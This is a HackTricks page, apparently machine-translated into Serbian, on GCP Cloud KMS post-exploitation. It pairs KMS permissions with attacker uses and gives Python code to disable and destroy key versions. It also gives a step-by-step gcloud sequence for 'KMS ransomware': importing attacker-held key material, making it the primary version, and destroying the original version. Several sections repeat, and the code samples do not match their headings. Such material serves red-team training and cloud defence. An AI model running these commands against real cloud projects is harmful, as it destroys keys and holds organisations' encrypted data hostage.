# GCP - KMS Post Exploitation

{% hint style="success" %}
Naučite i vežbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## KMS

Pronađite osnovne informacije o KMS-u u:

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

### `cloudkms.cryptoKeyVersions.destroy`

Napadač sa ovom dozvolom može uništiti KMS verziju. Da biste to uradili, prvo morate onemogućiti ključ, a zatim ga uništiti:
```python
# pip install google-cloud-kms

from google.cloud import kms

def disable_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Disables a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to disable the key version.
client.update_crypto_key_version(request={'crypto_key_version': {'name': key_version_name, 'state': kms.CryptoKeyVersion.State.DISABLED}})

def destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Destroys a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to destroy the key version.
client.destroy_crypto_key_version(request={'name': key_version_name})

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'  # Version number to disable and destroy

# Disable the key version
disable_key_version(project_id, location_id, key_ring_id, key_id, key_version)

# Destroy the key version
destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version)
```
### KMS Ransomware

U AWS-u je moguće potpuno **ukrasti KMS ključ** modifikovanjem KMS resursne politike i omogućavanjem samo napadačevom nalogu da koristi ključ. Pošto ove resursne politike ne postoje u GCP-u, ovo nije moguće.

Međutim, postoji drugi način da se izvede globalni KMS Ransomware, koji bi uključivao sledeće korake:

* Kreirajte novu **verziju ključa sa ključnim materijalom** koji je napadač uvezao

{% code overflow="wrap" %}
```bash
gcloud kms import-jobs create [IMPORT_JOB] --location [LOCATION] --keyring [KEY_RING] --import-method [IMPORT_METHOD] --protection-level [PROTECTION_LEVEL] --target-key [KEY]
```
{% endcode %}

* Postavite ga kao **podrazumevanu verziju** (za buduće podatke koji se šifruju)
* **Ponovo šifrujte starije podatke** šifrovane prethodnom verzijom sa novom.
* **Obrišite KMS ključ**
* Sada samo napadač, koji ima originalni materijal ključa, može da dešifruje šifrovane podatke

#### Ovde su koraci za uvoz nove verzije i onemogućavanje/brisanje starijih podataka:
```bash
# Encrypt something with the original key
echo "This is a sample text to encrypt" > /tmp/my-plaintext-file.txt
gcloud kms encrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--plaintext-file my-plaintext-file.txt \
--ciphertext-file my-encrypted-file.enc

# Decrypt it
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -


# Create an Import Job
gcloud kms import-jobs create my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--import-method "rsa-oaep-3072-sha1-aes-256" \
--protection-level "software"

# Generate key material
openssl rand -out my-key-material.bin 32

# Import the Key Material (it's encrypted with an asymetrict key of the import job previous to be sent)
gcloud kms keys versions import \
--import-job my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--algorithm "google-symmetric-encryption" \
--target-key-file my-key-material.bin

# Get versions
gcloud kms keys versions list \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key

# Make new version primary
gcloud kms keys update \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--primary-version 2

# Try to decrypt again (error)
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -

# Disable initial version
gcloud kms keys versions disable \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key 1

# Destroy the old version
gcloud kms keys versions destroy \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--version 1

```
### `cloudkms.cryptoKeyVersions.useToEncrypt` | `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation`

Ove uloge omogućavaju napadaču da šifruje podatke koristeći KMS ključeve. Ovo može biti korisno za napadača da sakrije tragove ili da šifruje ukradene podatke pre nego što ih iznese iz okruženja.

### `cloudkms.cryptoKeyVersions.useToDecrypt` | `cloudkms.cryptoKeyVersions.useToDecryptViaDelegation`

Ove uloge omogućavaju napadaču da dešifruje podatke koji su šifrovani KMS ključevima. Ako napadač ima pristup ovim ulogama, može dešifrovati poverljive informacije i koristiti ih za dalju eksfiltraciju ili zloupotrebu.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

Ova uloga omogućava napadaču da vidi javni ključ asimetričnog KMS ključa. Iako ovo samo po sebi nije dovoljno za dešifrovanje podataka, može biti korisno u kombinaciji sa drugim informacijama koje napadač poseduje.

### `cloudkms.cryptoKeyVersions.view`

Ova uloga omogućava napadaču da vidi metapodatke o verzijama KMS ključeva. Ovo može uključivati informacije kao što su status ključa, datum kreiranja i datum isteka, što može pomoći napadaču da bolje razume kako su ključevi korišćeni i da planira dalji napad.
```python
from google.cloud import kms
import base64

def encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext):
"""
Encrypts data using a symmetric key from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key name.
key_name = client.crypto_key_path(project_id, location_id, key_ring_id, key_id)

# Convert the plaintext to bytes.
plaintext_bytes = plaintext.encode('utf-8')

# Call the API.
encrypt_response = client.encrypt(request={'name': key_name, 'plaintext': plaintext_bytes})
ciphertext = encrypt_response.ciphertext

# Optional: Encode the ciphertext to base64 for easier handling.
return base64.b64encode(ciphertext)

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
plaintext = 'your-data-to-encrypt'

ciphertext = encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext)
print('Ciphertext:', ciphertext)
```
### `cloudkms.cryptoKeyVersions.useToSign`

Ova dozvola omogućava napadaču da koristi ključ za potpisivanje podataka. Ovo može biti korisno za napadača da potpiše zlonamerne transakcije ili dokumente kako bi izgledali legitimno.

### `cloudkms.cryptoKeyVersions.useToDecrypt`

Ova dozvola omogućava napadaču da dešifruje podatke koji su šifrovani pomoću određenog ključa. Ako napadač ima pristup šifrovanim podacima i odgovarajućem ključu, može dobiti pristup osetljivim informacijama.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

Ova dozvola omogućava napadaču da vidi javni ključ povezan sa privatnim ključem. Iako javni ključ sam po sebi nije osetljiv, može se koristiti u kombinaciji sa drugim informacijama za napade.

### `cloudkms.cryptoKeys.getIamPolicy`

Ova dozvola omogućava napadaču da dobije IAM politiku povezanu sa ključem. Ovo može pomoći napadaču da identifikuje druge korisnike ili servise koji imaju pristup ključu i potencijalno iskoristi te informacije za dalji napad.

### `cloudkms.cryptoKeys.setIamPolicy`

Ova dozvola omogućava napadaču da postavi IAM politiku za ključ. Napadač može dodati sebe ili druge zlonamerne korisnike kao korisnike sa visokim privilegijama, čime se omogućava dalji pristup i eksploatacija.
```python
import hashlib
from google.cloud import kms

def sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message):
"""
Sign a message using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Call the API to sign the digest.
sign_response = client.asymmetric_sign(name=key_version_name, digest=digest)
return sign_response.signature

# Example usage for signing
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'
message = 'your-message'

signature = sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message)
print('Signature:', signature)
```
### `cloudkms.cryptoKeyVersions.useToVerify`

Ova dozvola omogućava napadaču da koristi ključ za verifikaciju podataka. Ovo može biti korisno u scenarijima gde napadač želi da proveri autentičnost podataka ili poruka.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

Ova dozvola omogućava napadaču da vidi javni ključ povezan sa određenim CryptoKeyVersion. Javni ključevi se mogu koristiti za enkripciju podataka koji se kasnije mogu dekriptovati privatnim ključem.

### `cloudkms.cryptoKeyVersions.useToEncrypt`

Ova dozvola omogućava napadaču da koristi ključ za enkripciju podataka. Ovo može biti korisno za zaštitu podataka koje napadač želi da sačuva ili prenese.

### `cloudkms.cryptoKeyVersions.useToDecrypt`

Ova dozvola omogućava napadaču da koristi ključ za dekripciju podataka. Ovo je kritično jer omogućava napadaču pristup šifrovanim informacijama.

### `cloudkms.cryptoKeyVersions.destroy`

Ova dozvola omogućava napadaču da uništi određeni CryptoKeyVersion. Uništavanje ključeva može dovesti do gubitka pristupa šifrovanim podacima, što može biti štetno za organizaciju.

### `cloudkms.cryptoKeyVersions.restore`

Ova dozvola omogućava napadaču da povrati prethodno uništeni CryptoKeyVersion. Ovo može biti korisno ako napadač želi da povrati pristup podacima koji su bili šifrovani tim ključem.
```python
from google.cloud import kms
import hashlib

def verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature):
"""
Verify a signature using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Build the verify request and call the API.
verify_response = client.asymmetric_verify(name=key_version_name, digest=digest, signature=signature)
return verify_response.success

# Example usage for verification
verified = verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature)
print('Verified:', verified)
```
{% hint style="success" %}
Naučite i vežbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hacking trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
